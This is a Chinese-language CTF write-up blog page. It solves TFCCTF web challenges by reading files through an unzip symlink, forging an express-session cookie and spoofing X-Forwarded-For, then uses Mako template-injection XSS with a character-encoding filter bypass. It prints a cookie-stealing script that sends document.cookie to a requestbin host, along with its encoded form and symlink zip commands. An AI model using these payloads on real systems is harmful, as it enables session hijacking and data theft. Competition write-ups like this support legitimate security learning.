@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="12本次比赛只做了web的签到水平有限，速速复现 Slippyweb签到题，源码就不贴了关键部分 1234567891011121314151617181920212223242526router.post(&#x27;&#x2F;upload&#x27;, upload.single(&#x27;zipfile&#x27;), (req, res) &#x3D;&gt; &#123;    const zipPat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TFCCTF-web-replay">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="12本次比赛只做了web的签到水平有限，速速复现 Slippyweb签到题，源码就不贴了关键部分 1234567891011121314151617181920212223242526router.post(&#x27;&#x2F;upload&#x27;, upload.single(&#x27;zipfile&#x27;), (req, res) &#x3D;&gt; &#123;    const zipPat">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-02T07:19:41.000Z">
+<meta property="article:modified_time" content="2025-09-14T06:33:53.941Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>TFCCTF-web-replay</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/Shiro-unserialize-learn/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/sekaictf-2025-replay/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&text=TFCCTF-web-replay"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&is_video=false&description=TFCCTF-web-replay"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TFCCTF-web-replay&body=Check out this article: https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&name=TFCCTF-web-replay&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&t=TFCCTF-web-replay"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Slippy"><span class="toc-number">1.</span> <span class="toc-text">Slippy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KISSFIXESS"><span class="toc-number">2.</span> <span class="toc-text">KISSFIXESS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webless"><span class="toc-number">3.</span> <span class="toc-text">webless</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-NOTIFY"><span class="toc-number">4.</span> <span class="toc-text">DOM NOTIFY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        TFCCTF-web-replay
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-02T07:19:41.000Z" class="dt-published" itemprop="datePublished">2025-09-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本次比赛只做了web的签到</span><br><span class="line">水平有限，速速复现</span><br></pre></td></tr></table></figure></div>
+<h3 id="Slippy"><a href="#Slippy" class="headerlink" title="Slippy"></a>Slippy</h3><p>web签到题，源码就不贴了<br>关键部分</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  </span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(userDir, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/files&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);</span><br><span class="line">  fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>一眼unzip软链接<br>实现了任意文件读取<br>给的附件里有个.env，可以拿到<code>process.env.SESSION_SECRET</code><br>可以伪造session<br>但是express-session的模块不止于此,我们发现源码里已经建立了一个用户<code>develop</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></div>
+<p>我们还得知道session_id,即这个所谓附件中的占位符<br>至于如何知道这个占位符，直接去读server.js文件不就可了吗？<br>确实如此，拿到<br>session_id&#x3D;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E<br>又知<br><code>secret=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code><br>可以拿出session登录<code>userId=&#39;develop&#39;</code><br>脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置参数</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SESSION_ID</span> = <span class="string">&#x27;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&#x27;</span>; <span class="comment">// 指定sessionid</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="string">&#x27;3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b&#x27;</span>; <span class="comment">// 密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成签名</span></span><br><span class="line"><span class="keyword">const</span> signature = crypto</span><br><span class="line">  .<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable constant_">SECRET</span>)</span><br><span class="line">  .<span class="title function_">update</span>(<span class="variable constant_">SESSION_ID</span>)</span><br><span class="line">  .<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/\=+$/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成客户端需要的connect.sid</span></span><br><span class="line"><span class="keyword">const</span> connectSid = <span class="string">`s%3A<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(SESSION_ID)&#125;</span>.<span class="subst">$&#123;signature&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;生成的session信息：&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;原始sessionid：&#x27;</span>, <span class="variable constant_">SESSION_ID</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;客户端Cookie值：&#x27;</span>, connectSid);</span><br></pre></td></tr></table></figure></div>
+<p>至于我们为什么要登录这个session呢？看这里  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br></pre></td></tr></table></figure></div>
+<p>可以实现列目录的功能<br>如何通过这个developmentOnly.js文件呢？<br>看看</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userId</span> === <span class="string">&#x27;develop&#x27;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden: Development access only&#x27;</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>
+<p>因此想要实现这个debug功能列目录，必须<br><code>req.session.userId === &#39;develop&#39; &amp;&amp; req.ip == &#39;127.0.0.1&#39;</code>通过<br>user_id成功，127.0.0.1?xff伪造秒了<br>至于我们为什么要实现列目录呢?<br>因为dockerfile给flag文件赋了一个随机的路径，我们需要列目录读出来<br>走到这就结束了，拿到flag路径，软链接读就行了  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../../xxxxxxxx/flag.txt link</span><br><span class="line">zip --symlinks hack.zip  link</span><br></pre></td></tr></table></figure></div>
+<h3 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h3><p><code>用mato模板注入打xss</code><br>关键怎么绕过呢？<br>可以用<code>$&#123;7*7&#125;</code>发现成功49  </p>
+<p>这道题最令人毛骨悚然的（bushi,菜就多练<br>是mato模块里的一个绕过字符检测方式<br>利用‘%c’%115绕过s等等字符‘%c’%46绕过.‘%c’ % 36 绕过$等等，最后直接全部绕过  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;fetch(<span class="string">&#x27;http://requestbin.cn:80/u76c50u7?c=&#x27;</span>+document.cookie)&lt;/script&gt;</span><br><span class="line">有个脚本</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment"># 生成&#x27;%c&#x27;%ASCII码的payload字符串</span></span><br><span class="line">    parts = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">        parts.append(<span class="string">&quot;&#x27;%c&#x27;%&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; + &#x27;</span>.join(parts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 你可以修改这里的payload</span></span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&#x27;请输入要编码的payload: &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(encode_payload(payload))</span><br></pre></td></tr></table></figure></div>
+<p>直接编码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="string">&#x27;%c&#x27;</span>%60 + <span class="string">&#x27;%c&#x27;</span>%115 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%114 + <span class="string">&#x27;%c&#x27;</span>%105 + <span class="string">&#x27;%c&#x27;</span>%112 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%62 + <span class="string">&#x27;%c&#x27;</span>%102 + <span class="string">&#x27;%c&#x27;</span>%101 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%104 + <span class="string">&#x27;%c&#x27;</span>%40 + <span class="string">&#x27;%c&#x27;</span>%39 + <span class="string">&#x27;%c&#x27;</span>%104 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%112 + <span class="string">&#x27;%c&#x27;</span>%58 + <span class="string">&#x27;%c&#x27;</span>%47 + <span class="string">&#x27;%c&#x27;</span>%47 + <span class="string">&#x27;%c&#x27;</span>%114 + <span class="string">&#x27;%c&#x27;</span>%101 + <span class="string">&#x27;%c&#x27;</span>%113 + <span class="string">&#x27;%c&#x27;</span>%117 + <span class="string">&#x27;%c&#x27;</span>%101 + <span class="string">&#x27;%c&#x27;</span>%115 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%98 + <span class="string">&#x27;%c&#x27;</span>%105 + <span class="string">&#x27;%c&#x27;</span>%110 + <span class="string">&#x27;%c&#x27;</span>%46 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%110 + <span class="string">&#x27;%c&#x27;</span>%58 + <span class="string">&#x27;%c&#x27;</span>%56 + <span class="string">&#x27;%c&#x27;</span>%48 + <span class="string">&#x27;%c&#x27;</span>%47 + <span class="string">&#x27;%c&#x27;</span>%117 + <span class="string">&#x27;%c&#x27;</span>%55 + <span class="string">&#x27;%c&#x27;</span>%54 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%53 + <span class="string">&#x27;%c&#x27;</span>%48 + <span class="string">&#x27;%c&#x27;</span>%117 + <span class="string">&#x27;%c&#x27;</span>%55 + <span class="string">&#x27;%c&#x27;</span>%63 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%61 + <span class="string">&#x27;%c&#x27;</span>%39 + <span class="string">&#x27;%c&#x27;</span>%43 + <span class="string">&#x27;%c&#x27;</span>%100 + <span class="string">&#x27;%c&#x27;</span>%111 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%117 + <span class="string">&#x27;%c&#x27;</span>%109 + <span class="string">&#x27;%c&#x27;</span>%101 + <span class="string">&#x27;%c&#x27;</span>%110 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%46 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%111 + <span class="string">&#x27;%c&#x27;</span>%111 + <span class="string">&#x27;%c&#x27;</span>%107 + <span class="string">&#x27;%c&#x27;</span>%105 + <span class="string">&#x27;%c&#x27;</span>%101 + <span class="string">&#x27;%c&#x27;</span>%41 + <span class="string">&#x27;%c&#x27;</span>%60 + <span class="string">&#x27;%c&#x27;</span>%47 + <span class="string">&#x27;%c&#x27;</span>%115 + <span class="string">&#x27;%c&#x27;</span>%99 + <span class="string">&#x27;%c&#x27;</span>%114 + <span class="string">&#x27;%c&#x27;</span>%105 + <span class="string">&#x27;%c&#x27;</span>%112 + <span class="string">&#x27;%c&#x27;</span>%116 + <span class="string">&#x27;%c&#x27;</span>%62&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>太神了 还有一个利用的点 ${banned[0]} 也可以绕过部分字符</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>主要几个知识点，可以利用同时渲染的banned值以及mato支持python格式化的格式化绕过方式<br>比如  ‘%c’%60被渲染出来就是&lt;<br>但是仅有部分模板引擎支持这种渲染 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Mako  </span><br><span class="line">允许在 $&#123;&#125; 或 &lt;% %&gt; 中写任意 Python 表达式和语句。</span><br><span class="line">Tornado Template</span><br><span class="line">支持在模板中直接写 Python 表达式和控制流。</span><br><span class="line">Django Template（debug/非安全模式下）</span><br><span class="line">默认限制较多，但某些配置或自定义 filter 可执行原生 Python 表达式。</span><br><span class="line">Bottle SimpleTemplate (stpl)</span><br><span class="line">允许在 &#123;&#123; ... &#125;&#125; 或 % ... 中写原生 Python 表达式。</span><br><span class="line">Cheetah</span><br><span class="line">支持在模板中嵌入 Python 代码块。</span><br><span class="line">Chameleon</span><br><span class="line">支持部分原生 Python 表达式（如 $&#123;python: ...&#125;）。</span><br></pre></td></tr></table></figure></div>
